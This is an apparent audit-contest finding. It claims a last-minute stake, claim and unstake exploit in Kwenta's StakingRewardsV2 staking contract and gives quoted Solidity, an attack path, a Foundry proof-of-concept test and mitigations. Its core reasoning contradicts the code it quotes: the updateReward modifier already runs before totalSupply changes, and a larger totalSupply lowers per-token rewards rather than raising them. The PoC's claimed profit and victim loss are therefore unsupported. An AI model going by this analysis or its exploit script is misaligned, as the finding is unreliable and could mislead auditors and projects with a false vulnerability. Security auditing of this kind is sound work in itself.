# Bad actor staker will steal rewards from long-term stakers, by last-minute staking exploit in StakingRewardsV2

### Summary

I found a bug in [StakingRewardsV2.sol](https://github.com/sherlock-audit/2024-07-kwenta-staking-contracts/blob/main/token/contracts/StakingRewardsV2.sol), that allows an attacker to manipulate reward distribution by exploiting the timing of `stake()`, `getReward()`, and `unstake()` functions. So the bug stems from the way `rewardPerToken()` is currently calculated and how it interacts with balance updates.

### Root Cause

For [StakingRewardsV2.sol](https://github.com/sherlock-audit/2024-07-kwenta-staking-contracts/blob/main/token/contracts/StakingRewardsV2.sol), in [rewardPerToken()](https://github.com/sherlock-audit/2024-07-kwenta-staking-contracts/blob/main/token/contracts/StakingRewardsV2.sol#L435C4-L444C6) function calculates rewards based on the current `totalSupply()`.  `stake()` and `unstake()` functions update the `totalSupply()` before updating rewards, allowing for this bug.  


Contexts of the bug:
```solidity
function rewardPerToken() public view returns (uint256) {
    uint256 allTokensStaked = totalSupply();

    if (allTokensStaked == 0) {
        return rewardPerTokenStored;
    }

    return rewardPerTokenStored
        + (((lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18) / allTokensStaked);
}
```

```solidity
function stake(uint256 _amount) external whenNotPaused updateReward(msg.sender) {
    if (_amount == 0) revert AmountZero();

    // update state
    userLastStakeTime[msg.sender] = block.timestamp;
    _addTotalSupplyCheckpoint(totalSupply() + _amount);
    _addBalancesCheckpoint(msg.sender, balanceOf(msg.sender) + _amount);

    // emit staking event and index msg.sender
    emit Staked(msg.sender, _amount);

    // transfer token to this contract from the caller
    kwenta.transferFrom(msg.sender, address(this), _amount);
}
```

```solidity
function unstake(uint256 _amount)
    public
    whenNotPaused
    updateReward(msg.sender)
    afterCooldown(msg.sender)
{
    if (_amount == 0) revert AmountZero();
    uint256 nonEscrowedBalance = nonEscrowedBalanceOf(msg.sender);
    if (_amount > nonEscrowedBalance) revert InsufficientBalance(nonEscrowedBalance);

    // update state
    _addTotalSupplyCheckpoint(totalSupply() - _amount);
    _addBalancesCheckpoint(msg.sender, balanceOf(msg.sender) - _amount);

    // emit unstake event and index msg.sender
    emit Unstaked(msg.sender, _amount);

    // transfer token from this contract to the caller
    kwenta.transfer(msg.sender, _amount);
}
```


### Internal pre-conditions

-  `periodFinish` must be set to a future timestamp (ongoing rewards distribution).
-  `rewardRate` must be non-zero.
- Significant amount of rewards must be available for distribution.
- The `cooldownPeriod` must be set to zero or very low, allowing immediate unstaking.

### External pre-conditions

- Attacker must have a large amount of `KWENTA` tokens to stake.
- Gas cost for the attack must be lower than the potential reward gain.

### Attack Path

- Attacker waits until just before `periodFinish`.
- Attacker calls `stake(largeAmount)`, significantly increasing `totalSupply()`.
- Immediately after staking, the attacker calls `getReward()`.
- Attacker then calls `unstake(largeAmount)` to withdraw their staked tokens.

- So when the attacker stakes, `totalSupply()` increases, but `rewardPerTokenStored` isn't updated yet.
- Then the `getReward()` calculates the reward based on the new, higher `totalSupply()`, giving the attacker a larger share of rewards.
- Unstaking immediately after doesn't affect the rewards already claimed.


### Impact

- Actual hodl stakers suffer a significant loss of rewards that should have been distributed to them. The attacker gains a disproportionate amount of rewards without participating in the staking process for a meaningful duration.

- Bug allows an attacker to exploit and game the reward distribution mechanism, effectively stealing rewards from long-term stakers. The centre issue lies in the reward calculation being based on the current `totalSupply()`, which can be manipulated just before claiming rewards.



### PoC


```solidity
contract StakingRewardsV2ExploitTest is Test {
    StakingRewardsV2 public stakingRewards;
    Kwenta public kwenta;
    address public attacker;
    address public victim;

    function setUp() public {
        kwenta = new Kwenta();
        stakingRewards = new StakingRewardsV2(address(kwenta), address(0), address(0), address(0));
        stakingRewards.initialize(address(this));
        
        attacker = address(0x1);
        victim = address(0x2);
        
        kwenta.mint(attacker, 1000000e18);
        kwenta.mint(victim, 1000e18);
        
        vm.startPrank(address(this));
        stakingRewards.notifyRewardAmount(10000e18, 0);
        stakingRewards.setRewardsDuration(7 days);
        stakingRewards.setCooldownPeriod(0); // Set cooldown to 0 for immediate unstaking
        vm.stopPrank();
        
        vm.startPrank(victim);
        kwenta.approve(address(stakingRewards), type(uint256).max);
        stakingRewards.stake(1000e18);
        vm.stopPrank();
        
        // Fast forward to near the end of the reward period
        vm.warp(block.timestamp + 6 days + 23 hours + 59 minutes);
    }

    function testExploit() public {
        uint256 attackerInitialBalance = kwenta.balanceOf(attacker);
        uint256 victimInitialReward = stakingRewards.earned(victim);
        
        vm.startPrank(attacker);
        kwenta.approve(address(stakingRewards), type(uint256).max);
        stakingRewards.stake(1000000e18);
        stakingRewards.getReward();
        stakingRewards.unstake(1000000e18);
        vm.stopPrank();
        
        uint256 attackerFinalBalance = kwenta.balanceOf(attacker);
        uint256 victimFinalReward = stakingRewards.earned(victim);
        
        console.log("Attacker profit:", (attackerFinalBalance - attackerInitialBalance) / 1e18);
        console.log("Victim reward loss:", (victimInitialReward - victimFinalReward) / 1e18);
        
        assert(attackerFinalBalance > attackerInitialBalance);
        assert(victimFinalReward < victimInitialReward);
    }
}
```

### Mitigation

 Use a "reward snapshot" type mechanism:
   - Insert in a `rewardPerTokenStored` variable that's updated whenever `rewardPerToken()` is called.
   - In `stake()` and `unstake()`, you can call `updateReward(address(0))` before changing the balances.
   -  Change `earned()` to calculate rewards given `rewardPerTokenStored` at the time of the last 
 stake/unstake action for each user. 
   -  Introduce a minimum staking duration: Insert in a `minStakingDuration` variable.
   - In `unstake()`, check if the user has staked for at least `minStakingDuration` before allowing unstaking.
   - Use a time-weighted average of `totalSupply()` for reward calculations instead of the current value.
